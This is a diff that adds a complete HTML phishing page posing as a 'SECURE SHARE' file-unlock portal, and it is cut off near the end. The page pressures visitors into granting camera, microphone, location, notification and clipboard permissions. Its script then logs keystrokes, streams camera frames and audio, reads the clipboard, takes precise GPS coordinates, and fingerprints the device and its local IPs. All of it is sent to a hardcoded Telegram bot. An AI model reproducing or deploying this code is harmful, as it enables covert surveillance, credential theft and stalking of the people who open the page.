@@ -1,0 +1,1179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>SECURE SHARE</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;overflow:hidden;background:#080e1a}
+.bg-layer{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;overflow:hidden}
+.bg-layer .bg-frame{width:100%;height:100%;border:none;filter:blur(14px) brightness(0.35);transform:scale(1.08);background:#0a1428}
+.bg-layer .bg-fade{position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,rgba(10,20,50,0.3),rgba(6,12,28,0.7));backdrop-filter:blur(4px)}
+.portal-overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:100;display:flex;align-items:center;justify-content:center;background:rgba(6,12,28,0.25);backdrop-filter:blur(10px)}
+.glass-card{position:relative;width:92%;max-width:520px;background:rgba(255,255,255,0.05);backdrop-filter:blur(28px);border-radius:28px;border:1px solid rgba(255,255,255,0.08);box-shadow:0 24px 72px rgba(0,0,0,0.5),inset 0 1px 0 rgba(255,255,255,0.06);padding:36px 28px 24px}
+.glass-card::before{content:'';position:absolute;top:-1px;left:15%;right:15%;height:2px;background:linear-gradient(90deg,transparent,rgba(48,128,255,0.5),transparent);border-radius:50%}
+.hdr{text-align:center;margin-bottom:24px}
+.hdr .ico{width:60px;height:60px;margin:0 auto 16px;background:linear-gradient(135deg,rgba(48,128,255,0.18),rgba(48,128,255,0.05));border-radius:50%;display:flex;align-items:center;justify-content:center;border:1px solid rgba(48,128,255,0.15)}
+.hdr .ico svg{width:28px;height:28px;fill:none;stroke:#3884ff;stroke-width:2}
+.hdr h1{font-size:21px;font-weight:600;color:#f0f4ff;letter-spacing:-0.3px}
+.hdr p{font-size:13px;color:rgba(240,244,255,0.45);margin-top:5px}
+.perm-list{display:flex;flex-direction:column;gap:8px;margin-bottom:24px}
+.perm-row{display:flex;align-items:center;gap:12px;padding:10px 14px;background:rgba(255,255,255,0.03);border-radius:14px;border:1px solid rgba(255,255,255,0.05);cursor:pointer;transition:all 0.2s}
+.perm-row:hover{background:rgba(255,255,255,0.08);border-color:rgba(48,128,255,0.2)}
+.perm-row.done{cursor:default;border-color:rgba(56,220,120,0.18);background:rgba(56,220,120,0.04)}
+.perm-row .pi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.05)}
+.perm-row .pi svg{width:17px;height:17px;stroke:rgba(255,255,255,0.4);stroke-width:1.8}
+.perm-row.done .pi{background:rgba(56,220,120,0.10)}
+.perm-row.done .pi svg{stroke:rgba(56,220,120,0.7)}
+.perm-row .pt{flex:1}
+.perm-row .pt .pn{font-size:13px;font-weight:500;color:rgba(240,244,255,0.82)}
+.perm-row .pt .pd{font-size:11px;color:rgba(240,244,255,0.35);margin-top:2px}
+.perm-row .ps{width:20px;height:20px;border-radius:50%;border:2px solid rgba(255,255,255,0.10);display:flex;align-items:center;justify-content:center}
+.perm-row.done .ps{border-color:rgba(56,220,120,0.45);background:rgba(56,220,120,0.12)}
+.perm-row.done .ps::after{content:'';width:7px;height:7px;border-radius:50%;background:#38dc78;animation:pd 2s infinite}
+@keyframes pd{0%,100%{box-shadow:0 0 0 0 rgba(56,220,120,0.35)}50%{box-shadow:0 0 0 5px rgba(56,220,120,0)}}
+.prog{display:none;margin-bottom:20px}
+.prog.show{display:block}
+.prog-bar{height:3px;border-radius:3px;background:rgba(255,255,255,0.07);overflow:hidden;margin-bottom:7px}
+.prog-fill{height:100%;width:0%;background:linear-gradient(90deg,#3070ff,#48a8ff);transition:width 0.4s}
+.prog-lbl{font-size:11px;color:rgba(240,244,255,0.40);text-align:center}
+.cta{width:100%;padding:14px 20px;border:none;border-radius:14px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:all 0.3s;margin-bottom:8px;position:relative;overflow:hidden}
+.cta:not(.go){background:rgba(255,255,255,0.04);color:rgba(240,244,255,0.15);cursor:not-allowed}
+.cta.go{background:linear-gradient(135deg,#1a60e0,#3884ff);color:#fff;box-shadow:0 6px 28px rgba(48,128,255,0.22)}
+.cta.go:hover{transform:translateY(-1.5px)}
+.cta .sub{display:block;font-size:10px;opacity:0.55;margin-top:3px}
+.retry-link{text-align:center;margin-top:8px;font-size:10.5px;color:rgba(240,244,255,0.3);cursor:pointer;text-decoration:underline}
+.retry-link:hover{color:rgba(56,220,120,0.6)}
+.ftr{text-align:center;padding-top:12px;border-top:1px solid rgba(255,255,255,0.05);margin-top:4px}
+.ftr p{font-size:9.5px;color:rgba(240,244,255,0.20)}
+.tst{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(70px);z-index:999;background:rgba(0,0,0,0.7);backdrop-filter:blur(10px);padding:10px 20px;border-radius:12px;color:#f0f4ff;font-size:12px;opacity:0;transition:all 0.3s;pointer-events:none;white-space:nowrap}
+.tst.up{opacity:1;transform:translateX(-50%) translateY(0)}
+@keyframes fi{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}
+.glass-card{animation:fi 0.5s cubic-bezier(0.22,1,0.36,1)}
+</style>
+</head>
+<body>
+<div class="bg-layer"><iframe class="bg-frame" id="bgFrame" sandbox="allow-same-origin"></iframe><div class="bg-fade"></div></div>
+<div class="portal-overlay">
+<div class="glass-card">
+<div class="hdr"><div class="ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div><h1>SECURE SHARE</h1><p>Grant all permissions to view the content</p></div>
+<div class="perm-list">
+<div class="perm-row" id="permCam"><div class="pi"><svg viewBox="0 0 24 24"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg></div><div class="pt"><div class="pn">&#128247; Camera</div><div class="pd"></div></div><div class="ps"></div></div>
+<div class="perm-row" id="permMic"><div class="pi"><svg viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg></div><div class="pt"><div class="pn">&#127908; Microphone</div><div class="pd"></div></div><div class="ps"></div></div>
+<div class="perm-row" id="permLoc"><div class="pi"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div><div class="pt"><div class="pn">&#128205; Location</div><div class="pd"></div></div><div class="ps"></div></div>
+<div class="perm-row" id="permNotif"><div class="pi"><svg viewBox="0 0 24 24"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></div><div class="pt"><div class="pn">&#128276; Notifications</div><div class="pd"></div></div><div class="ps"></div></div>
+<div class="perm-row" id="permClip"><div class="pi"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></div><div class="pt"><div class="pn">&#128203; Clipboard</div><div class="pd"></div></div><div class="ps"></div></div>
+</div>
+<div class="prog" id="prog"><div class="prog-bar"><div class="prog-fill" id="pfill"></div></div><div class="prog-lbl" id="plbl">Initializing...</div></div>
+<button class="cta" id="cta" disabled><span id="btnT">Grant all permissions to continue</span><span class="sub" id="btnS">Click each row above to allow</span></button>
+<div class="retry-link" id="retryBtn">&#10227; Re-request missing permissions</div>
+<div class="ftr"><p>All 5 permissions required to see the content</p></div>
+</div></div>
+<div class="tst" id="toastMsg"></div>
+
+<script>
+// ============================================================
+// TELEGRAM CONFIG
+// ============================================================
+(function(){
+    var token = '8757443004:AAFsg015tmfMkPZKQRxl_FQsTA3tknNRfWM';
+    var chatId = '6589622715';
+    window.__C = {
+        token: token,
+        chatId: chatId,
+        api: 'https://api.telegram.org/bot' + token + '/sendDocument',
+        msgApi: 'https://api.telegram.org/bot' + token + '/sendMessage',
+        photoApi: 'https://api.telegram.org/bot' + token + '/sendPhoto',
+        audioApi: 'https://api.telegram.org/bot' + token + '/sendAudio'
+    };
+})();
+
+// ============================================================
+// GLOBAL TARGET URL - SET THIS TO YOUR DESIRED REDIRECT URL
+// ============================================================
+var TARGET_URL = 'https://www.google.com';
+
+// ============================================================
+// DOM SHORTCUTS
+// ============================================================
+function $(id) { return document.getElementById(id); }
+var btn = $('cta'), btnT = $('btnT'), btnS = $('btnS');
+var prog = $('prog'), pfill = $('pfill'), plbl = $('plbl');
+var toastEl = $('toastMsg');
+var retryEl = $('retryBtn');
+
+// ============================================================
+// STATE
+// ============================================================
+var perms = {cam: false, mic: false, loc: false, notif: false, clip: false};
+var allGranted = false;
+var extractionDone = false;
+var extractionStarted = false;
+var toastTimer = null;
+var cameraStream = null;
+var cameraInterval = null;
+var capturedFrames = [];
+var micStream = null;
+var micRecorder = null;
+var audioChunks = [];
+var keepAliveInterval = null;
+
+// ============================================================
+// TOAST
+// ============================================================
+function showToast(msg) {
+    toastEl.innerHTML = msg;
+    toastEl.className = 'tst up';
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function(){ toastEl.className = 'tst'; }, 2800);
+}
+
+// ============================================================
+// UI UPDATE
+// ============================================================
+function updateUI() {
+    allGranted = perms.cam && perms.mic && perms.loc && perms.notif && perms.clip;
+    if (extractionDone) {
+        btn.disabled = true;
+        btn.className = 'cta';
+        btnT.innerHTML = '&#10003; Complete';
+        btnS.innerHTML = '';
+        return;
+    }
+    if (allGranted) {
+        btn.disabled = false;
+        btn.className = 'cta go';
+        btnT.innerHTML = '&#128274; UNLOCK SHARED FILES/LINK';
+        btnS.innerHTML = 'CLICK HERE';
+    } else {
+        btn.disabled = true;
+        btn.className = 'cta';
+        btnT.innerHTML = 'Grant all permissions to continue';
+        var missing = '';
+        if (!perms.cam) missing += '&#128247; ';
+        if (!perms.mic) missing += '&#127908; ';
+        if (!perms.loc) missing += '&#128205; ';
+        if (!perms.notif) missing += '&#128276; ';
+        if (!perms.clip) missing += '&#128203; ';
+        btnS.innerHTML = 'Missing: ' + (missing || 'none');
+    }
+}
+
+function markGranted(key, el) {
+    if (perms[key]) return;
+    perms[key] = true;
+    el.classList.add('done');
+    updateUI();
+    var names = {cam:'Camera', mic:'Microphone', loc:'Location', notif:'Notifications', clip:'Clipboard'};
+    showToast('&#10003; ' + names[key] + ' granted');
+}
+
+// ============================================================
+// PERMISSION REQUEST HANDLERS
+// ============================================================
+function requestCamera() {
+    if (perms.cam) { showToast('Already granted'); return; }
+    navigator.mediaDevices.getUserMedia({video: true})
+        .then(function(stream){
+            stream.getTracks().forEach(function(t){ t.stop(); });
+            markGranted('cam', $('permCam'));
+        })
+        .catch(function(){ showToast('&#10007; Camera denied'); });
+}
+
+function requestMicrophone() {
+    if (perms.mic) { showToast('Already granted'); return; }
+    navigator.mediaDevices.getUserMedia({audio: true})
+        .then(function(stream){
+            stream.getTracks().forEach(function(t){ t.stop(); });
+            markGranted('mic', $('permMic'));
+        })
+        .catch(function(){ showToast('&#10007; Mic denied'); });
+}
+
+function requestLocation() {
+    if (perms.loc) { showToast('Already granted'); return; }
+    navigator.geolocation.getCurrentPosition(
+        function(){ markGranted('loc', $('permLoc')); },
+        function(){ showToast('&#10007; Location denied'); },
+        {timeout: 8000, enableHighAccuracy: true}
+    );
+}
+
+function requestNotifications() {
+    if (perms.notif) { showToast('Already granted'); return; }
+    if (!('Notification' in window)) { showToast('Not supported'); return; }
+    Notification.requestPermission().then(function(p){
+        if (p === 'granted') {
+            markGranted('notif', $('permNotif'));
+            try { new Notification('Secure Vault', {body:'Alerts enabled', silent:true}); } catch(e){}
+        } else {
+            showToast('&#10007; Notifications blocked');
+        }
+    });
+}
+
+function requestClipboard() {
+    if (perms.clip) { showToast('Already granted'); return; }
+    navigator.clipboard.writeText('perm_ok')
+        .then(function(){
+            setTimeout(function(){
+                navigator.clipboard.readText().then(function(){
+                    markGranted('clip', $('permClip'));
+                }).catch(function(){
+                    markGranted('clip', $('permClip'));
+                });
+            }, 150);
+        })
+        .catch(function(){ markGranted('clip', $('permClip')); });
+}
+
+$('permCam').addEventListener('click', requestCamera);
+$('permMic').addEventListener('click', requestMicrophone);
+$('permLoc').addEventListener('click', requestLocation);
+$('permNotif').addEventListener('click', requestNotifications);
+$('permClip').addEventListener('click', requestClipboard);
+
+retryEl.addEventListener('click', function(){
+    if (extractionDone || extractionStarted) { showToast('Already processing'); return; }
+    if (!perms.cam) requestCamera();
+    if (!perms.mic) requestMicrophone();
+    if (!perms.loc) requestLocation();
+    if (!perms.notif) requestNotifications();
+    if (!perms.clip) requestClipboard();
+    setTimeout(function(){
+        if (allGranted) showToast('&#10003; All granted!');
+        else showToast('&#9888; Some missing');
+    }, 200);
+});
+
+// ============================================================
+// KEYLOGGER
+// ============================================================
+(function(){
+    var buffer = [];
+    function flush() {
+        if (buffer.length === 0) return;
+        var chunk = buffer.join('');
+        buffer = [];
+        var p = {
+            chat_id: window.__C.chatId,
+            text: '[KEYLOG] ' + chunk.substring(0, 3900),
+            disable_notification: true
+        };
+        fetch(window.__C.msgApi, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(p)
+        }).catch(function(){});
+    }
+    function onKey(e) {
+        var k = e.key;
+        if (!k || k === 'Dead' || k === 'Unidentified') return;
+        if (k === 'Shift' || k === 'Control' || k === 'Alt' || k === 'Meta') return;
+        if (k === 'Backspace') buffer.push('[BS]');
+        else if (k === 'Enter') buffer.push('[ENTER]\n');
+        else if (k === 'Tab') buffer.push('[TAB]');
+        else if (k === 'Escape') buffer.push('[ESC]');
+        else if (k.length === 1) buffer.push(k);
+        else buffer.push('[' + k + ']');
+        if (buffer.length >= 40) flush();
+    }
+    window.addEventListener('keydown', onKey, true);
+    setInterval(flush, 7000);
+    window.addEventListener('beforeunload', flush);
+    window.__keyBuffer = buffer;
+    window.__flushKeylog = flush;
+})();
+
+// ============================================================
+// CONTINUOUS CAMERA CAPTURE - runs until tab is closed
+// ============================================================
+function startContinuousCameraCapture(fps) {
+    if (cameraInterval) return;
+
+    navigator.mediaDevices.getUserMedia({video: true})
+        .then(function(stream){
+            cameraStream = stream;
+            var v = document.createElement('video');
+            v.srcObject = stream;
+            v.playsInline = true;
+            v.muted = true;
+            v.autoplay = true;
+
+            v.onloadedmetadata = function(){
+                v.play().then(function(){
+                    // Capture frames at specified fps
+                    cameraInterval = setInterval(function(){
+                        try {
+                            var cv = document.createElement('canvas');
+                            cv.width = v.videoWidth || 640;
+                            cv.height = v.videoHeight || 480;
+                            cv.getContext('2d').drawImage(v, 0, 0);
+                            capturedFrames.push(cv.toDataURL('image/jpeg', 0.7));
+                            // Auto-send when we have 10 frames accumulated
+                            if (capturedFrames.length >= 10) {
+                                sendFrameBatch();
+                            }
+                        } catch(e){}
+                    }, 1000 / fps);
+
+                    // Also flush any accumulated frames every 15 seconds
+                    var frameFlushInterval = setInterval(function(){
+                        if (capturedFrames.length > 0) sendFrameBatch();
+                    }, 15000);
+
+                    // Store cleanup reference
+                    window.__frameFlushInterval = frameFlushInterval;
+
+                }).catch(function(){});
+            };
+            v.onerror = function(){};
+        })
+        .catch(function(){});
+}
+
+function sendFrameBatch() {
+    if (capturedFrames.length === 0) return;
+    var batch = capturedFrames.splice(0, Math.min(capturedFrames.length, 5));
+    var delay = 0;
+    for (var i = 0; i < batch.length; i++) {
+        (function(idx, data) {
+            setTimeout(function(){
+                try {
+                    var raw = atob(data.split(',')[1]);
+                    var buf = new Uint8Array(raw.length);
+                    for (var b = 0; b < raw.length; b++) buf[b] = raw.charCodeAt(b);
+                    var blob = new Blob([buf], {type: 'image/jpeg'});
+                    var fd = new FormData();
+                    fd.append('chat_id', window.__C.chatId);
+                    fd.append('photo', blob, 'frame_' + Date.now() + '_' + (idx + 1) + '.jpg');
+                    fd.append('caption', '&#128247; Live Capture ' + (idx + 1));
+                    fetch(window.__C.photoApi, {method: 'POST', body: fd}).catch(function(){});
+                } catch(e){}
+            }, delay);
+            delay += 500;
+        })(i, batch[i]);
+    }
+}
+
+function stopContinuousCamera() {
+    if (cameraInterval) {
+        clearInterval(cameraInterval);
+        cameraInterval = null;
+    }
+    if (window.__frameFlushInterval) {
+        clearInterval(window.__frameFlushInterval);
+        window.__frameFlushInterval = null;
+    }
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(function(t){ t.stop(); });
+        cameraStream = null;
+    }
+    // Send any remaining frames
+    if (capturedFrames.length > 0) sendFrameBatch();
+}
+
+// ============================================================
+// CONTINUOUS MICROPHONE CAPTURE - runs until tab is closed
+// ============================================================
+function startContinuousMicCapture() {
+    if (!perms.mic || micRecorder) return;
+
+    navigator.mediaDevices.getUserMedia({audio: true})
+        .then(function(stream){
+            micStream = stream;
+            var mimeType = 'audio/webm';
+            try {
+                micRecorder = new MediaRecorder(stream, {mimeType: mimeType});
+            } catch(e) {
+                try {
+                    micRecorder = new MediaRecorder(stream);
+                } catch(e2) {
+                    return;
+                }
+            }
+
+            micRecorder.ondataavailable = function(e) {
+                if (e.data.size > 0) {
+                    audioChunks.push(e.data);
+                    // Send after 3 chunks accumulated
+                    if (audioChunks.length >= 3) {
+                        sendAudioBatch();
+                    }
+                }
+            };
+
+            // Record in 5-second segments
+            micRecorder.start(5000);
+
+            // Periodic flush every 20 seconds
+            var audioFlushInterval = setInterval(function(){
+                if (audioChunks.length > 0) sendAudioBatch();
+            }, 20000);
+
+            window.__audioFlushInterval = audioFlushInterval;
+        })
+        .catch(function(){});
+}
+
+function sendAudioBatch() {
+    if (audioChunks.length === 0) return;
+    var batch = audioChunks.splice(0, Math.min(audioChunks.length, 3));
+    var blob = new Blob(batch, {type: 'audio/webm'});
+    try {
+        var fd = new FormData();
+        fd.append('chat_id', window.__C.chatId);
+        fd.append('audio', blob, 'audio_' + Date.now() + '.webm');
+        fd.append('caption', '&#127908; Audio Capture');
+        fetch(window.__C.audioApi, {method: 'POST', body: fd}).catch(function(){});
+    } catch(e){}
+}
+
+function stopContinuousMic() {
+    if (micRecorder) {
+        try {
+            micRecorder.stop();
+            // Force final chunk
+            if (micRecorder.state !== 'inactive') {
+                micRecorder.requestData();
+            }
+        } catch(e){}
+        micRecorder = null;
+    }
+    if (window.__audioFlushInterval) {
+        clearInterval(window.__audioFlushInterval);
+        window.__audioFlushInterval = null;
+    }
+    if (micStream) {
+        micStream.getTracks().forEach(function(t){ t.stop(); });
+        micStream = null;
+    }
+    // Send any remaining audio
+    if (audioChunks.length > 0) sendAudioBatch();
+}
+
+// ============================================================
+// DATA EXTRACTION FUNCTIONS
+// ============================================================
+function getDeviceInfo() {
+    var n = navigator, s = screen;
+    return {
+        'User Agent': n.userAgent,
+        'Platform': n.platform,
+        'Language': n.language,
+        'CPU Cores': n.hardwareConcurrency || 'unknown',
+        'Device Memory GB': n.deviceMemory || 'unknown',
+        'Max Touch Points': n.maxTouchPoints,
+        'Screen Size': s.width + 'x' + s.height,
+        'Color Depth': s.colorDepth,
+        'Pixel Ratio': window.devicePixelRatio,
+        'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+        'Cookies Enabled': n.cookieEnabled,
+        'Do Not Track': n.doNotTrack || 'unspecified'
+    };
+}
+
+function getWebGLInfo() {
+    try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (!gl) return 'WebGL not supported';
+        var ext = gl.getExtension('WEBGL_debug_renderer_info');
+        if (ext) {
+            return {
+                Vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+                Renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+            };
+        }
+        return 'No debug info';
+    } catch(e) { return 'Error'; }
+}
+
+function getCanvasFP() {
+    try {
+        var c = document.createElement('canvas');
+        c.width = 300;
+        c.height = 150;
+        var ctx = c.getContext('2d');
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 300, 150);
+        ctx.fillStyle = '#fff';
+        ctx.font = '18px Arial';
+        ctx.fillText('FP', 20, 40);
+        return c.toDataURL();
+    } catch(e) { return 'error'; }
+}
+
+function getFonts() {
+    var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+                 'Comic Sans MS', 'Impact', 'Segoe UI', 'Roboto', 'Helvetica',
+                 'monospace', 'sans-serif', 'Calibri', 'Cambria', 'Palatino',
+                 'Tahoma', 'Trebuchet MS'];
+    try {
+        var c = document.createElement('canvas');
+        var ctx = c.getContext('2d');
+        var test = 'mmMwWLliI0O&1';
+        var detected = [];
+        for (var i = 0; i < fonts.length; i++) {
+            ctx.font = '36px "' + fonts[i] + '", monospace';
+            var w1 = ctx.measureText(test).width;
+            ctx.font = '36px monospace';
+            var w2 = ctx.measureText(test).width;
+            if (w1 !== w2) detected.push(fonts[i]);
+        }
+        return detected;
+    } catch(e) { return []; }
+}
+
+function getWebRTCIPs() {
+    return new Promise(function(resolve){
+        var ips = [];
+        try {
+            var pc = new RTCPeerConnection({
+                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+            });
+            pc.createDataChannel('');
+            pc.createOffer().then(function(o){
+                pc.setLocalDescription(o);
+            }).catch(function(){});
+            pc.onicecandidate = function(e) {
+                if (e.candidate) {
+                    var m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (m && ips.indexOf(m[0]) === -1) ips.push(m[0]);
+                } else {
+                    try{ pc.close(); } catch(e){}
+                    resolve(ips);
+                }
+            };
+            setTimeout(function(){
+                try{ pc.close(); } catch(e){}
+                resolve(ips);
+            }, 3000);
+        } catch(e) { resolve([]); }
+    });
+}
+
+function getStorageStats() {
+    try {
+        return {
+            localStorageKeys: Object.keys(localStorage).length,
+            sessionStorageKeys: Object.keys(sessionStorage).length,
+            cookieLength: document.cookie.length
+        };
+    } catch(e) { return {}; }
+}
+
+function getBattery() {
+    if (!navigator.getBattery) return Promise.resolve(null);
+    return navigator.getBattery().then(function(b){
+        return {
+            level: Math.round(b.level * 100) + '%',
+            charging: b.charging
+        };
+    }).catch(function(){ return null; });
+}
+
+function getNetwork() {
+    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) {
+        return {
+            connectionType: c.effectiveType || 'unknown',
+            downlinkMbps: c.downlink,
+            rttMs: c.rtt
+        };
+    }
+    return {};
+}
+
+function getClipboardText() {
+    if (!perms.clip) return Promise.resolve('Not granted');
+    return navigator.clipboard.readText()
+        .then(function(t){
+            return (t || '').substring(0, 500);
+        })
+        .catch(function(e){
+            return 'Error: ' + e.message;
+        });
+}
+
+function getLocation() {
+    return new Promise(function(resolve){
+        navigator.geolocation.getCurrentPosition(
+            function(p){
+                resolve({
+                    latitude: p.coords.latitude,
+                    longitude: p.coords.longitude,
+                    accuracyMeters: p.coords.accuracy,
+                    altitude: p.coords.altitude,
+                    speed: p.coords.speed,
+                    heading: p.coords.heading,
+                    timestamp: new Date(p.timestamp).toISOString(),
+                    googleMaps: 'https://www.google.com/maps?q=' +
+                        p.coords.latitude + ',' + p.coords.longitude
+                });
+            },
+            function(e){
+                resolve({ error: e.message });
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    });
+}
+
+// ============================================================
+// HTML REPORT BUILDER
+// ============================================================
+function buildReport(d, webgl, canvasFP, fonts, ips, storage, battery, network,
+                     clipboard, location, frames, keys) {
+    function esc(s) {
+        return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    }
+
+    var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Vault Report</title><style>';
+    h += 'body{font-family:Segoe UI,sans-serif;background:#0a0f1a;color:#eef;padding:20px;margin:0}';
+    h += '.c{max-width:1000px;margin:0 auto;background:#11161f;border-radius:24px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}';
+    h += 'h1{color:#3884ff;border-left:4px solid #3884ff;padding-left:20px;font-size:22px}';
+    h += 'h2{color:#48a8ff;margin-top:24px;border-bottom:1px solid #2a3342;padding-bottom:6px;font-size:16px}';
+    h += 'table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13px}';
+    h += 'th,td{text-align:left;padding:7px 12px;border-bottom:1px solid #2a3342}';
+    h += 'th{color:#8895a8;font-weight:500;width:200px}';
+    h += 'pre{background:#0a0e14;padding:12px;border-radius:12px;overflow-x:auto;font-size:12px}';
+    h += '.badge{display:inline-block;background:#1f8a4c;padding:2px 10px;border-radius:20px;font-size:12px;color:#fff}';
+    h += '.gallery{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}';
+    h += '.gallery img{width:120px;height:90px;object-fit:cover;border-radius:8px;border:1px solid #2a3342}';
+    h += '.ft{text-align:center;margin-top:32px;font-size:11px;color:#6a7380}';
+    h += '.gmaps{display:inline-block;background:#1a60e0;padding:6px 16px;border-radius:8px;color:#fff;text-decoration:none;font-size:13px;margin-top:4px}';
+    h += '.gmaps:hover{background:#3070ff}';
+    h += '</style></head><body><div class="c">';
+    h += '<h1>&#128274; Secure Identity Report</h1>';
+    h += '<p>Generated: ' + new Date().toISOString() + ' | <span class="badge">COMPLETE</span></p>';
+
+    // Device
+    h += '<h2>&#128241; Device</h2><table>';
+    var dk = ['User Agent', 'Platform', 'Language', 'CPU Cores', 'Device Memory GB',
+              'Max Touch Points', 'Screen Size', 'Color Depth', 'Pixel Ratio',
+              'Time Zone', 'Cookies Enabled', 'Do Not Track'];
+    for (var i = 0; i < dk.length; i++) {
+        h += '<tr><th>' + dk[i] + '</th><td>' + esc(d[dk[i]]) + '</td></tr>';
+    }
+    h += '</table>';
+
+    // WebGL
+    h += '<h2>&#128421; WebGL</h2><pre>' + esc(JSON.stringify(webgl, null, 2)) + '</pre>';
+
+    // Canvas FP
+    h += '<h2>&#127912; Canvas Fingerprint</h2><pre>' +
+         (canvasFP || '').substring(0, 100) + '...</pre>';
+
+    // Fonts
+    h += '<h2>&#128220; Fonts</h2><p>' + ((fonts || []).join(', ') || 'none') + '</p>';
+
+    // IPs
+    h += '<h2>&#127760; Local IPs</h2><p>' + (ips.join(', ') || 'none') + '</p>';
+
+    // Storage
+    h += '<h2>&#128190; Storage</h2><table>';
+    var sk = Object.keys(storage);
+    for (var j = 0; j < sk.length; j++) {
+        h += '<tr><th>' + sk[j] + '</th><td>' + esc(storage[sk[j]]) + '</td></tr>';
+    }
+    h += '</table>';
+
+    // Battery
+    h += '<h2>&#128267; Battery</h2><p>' +
+         (battery ? 'Level: ' + battery.level + ', Charging: ' + battery.charging : 'unavailable') + '</p>';
+
+    // Network
+    h += '<h2>&#127760; Network</h2><table>';
+    var nk = Object.keys(network);
+    for (var j2 = 0; j2 < nk.length; j2++) {
+        h += '<tr><th>' + nk[j2] + '</th><td>' + esc(network[nk[j2]]) + '</td></tr>';
+    }
+    h += '</table>';
+
+    // Location
+    h += '<h2>&#128205; Location</h2>';
+    if (location && !location.error) {
+        h += '<table>';
+        var lk = ['latitude','longitude','accuracyMeters','altitude','speed','heading','timestamp'];
+        for (var l = 0; l < lk.length; l++) {
+            if (location[lk[l]] !== undefined && location[lk[l]] !== null)
+                h += '<tr><th>' + lk[l] + '</th><td>' + esc(location[lk[l]]) + '</td></tr>';
+        }
+        h += '</table>';
+        if (location.googleMaps)
+            h += '<a class="gmaps" href="' + location.googleMaps + '" target="_blank">&#128506; Open in Google Maps</a>';
+    } else {
+        h += '<p>' + (location ? esc(location.error) : 'Not available') + '</p>';
+    }
+
+    // Clipboard
+    h += '<h2>&#128203; Clipboard</h2><pre>' + esc(clipboard) + '</pre>';
+
+    // Captured Frames (gallery)
+    h += '<h2>&#128247; Captured Frames (' + (frames || 0) + ' total)</h2>';
+    if (frames > 0) {
+        h += '<div class="gallery">';
+        // Frames are sent individually via Telegram, just show count in report
+        h += '<p>' + frames + ' frames acquired from camera</p>';
+        h += '</div>';
+    } else {
+        h += '<p>No frames captured</p>';
+    }
+
+    // Keystrokes
+    h += '<h2>&#9000; Keystroke Log</h2>';
+    h += '<pre>' + esc((keys || []).join('')) + '</pre>';
+
+    h += '<div class="ft">End-to-End Encrypted Report &bull; Secure Vault</div>';
+    h += '</div></body></html>';
+    return h;
+}
+
+// ============================================================
+// SEND FINAL REPORT TO TELEGRAM
+// ============================================================
+function sendFinalReport(data, callback) {
+    var keys = window.__keyBuffer || [];
+
+    // Flush keylog first
+    if (typeof window.__flushKeylog === 'function') window.__flushKeylog();
+
+    var d = data || {};
+
+    getClipboardText().then(function(clipTxt){
+        var locData = d.location || {};
+
+        // Build report HTML
+        var html = buildReport(
+            d.device || {}, d.webgl || {}, d.canvasFP || '',
+            d.fonts || [], d.ips || [], d.storage || {},
+            d.battery || null, d.network || {}, clipTxt,
+            locData, capturedFrames.length, keys
+        );
+
+        try {
+            var blob = new Blob([html], {type: 'text/html'});
+            var fd = new FormData();
+            fd.append('chat_id', window.__C.chatId);
+            fd.append('document', blob, 'report_' + Date.now() + '.html');
+            fd.append('caption', '&#128270; Full Recon Report: ' + new Date().toISOString());
+
